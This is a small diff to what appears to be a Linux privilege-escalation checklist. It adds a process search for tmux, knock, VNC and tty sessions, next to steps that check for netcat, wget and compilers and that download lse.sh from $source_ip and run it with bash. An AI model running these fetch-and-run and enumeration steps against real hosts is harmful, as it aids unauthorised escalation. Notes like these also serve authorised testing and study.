@@ -7,6 +7,9 @@ Determine if kernel exploit is intended:
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null
 ```
 ```
+ps -ef | grep -E "tmux|knock|vnc|tty"
+```
+```
 wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 2 | tee lse.sh.out
 ```
 ```
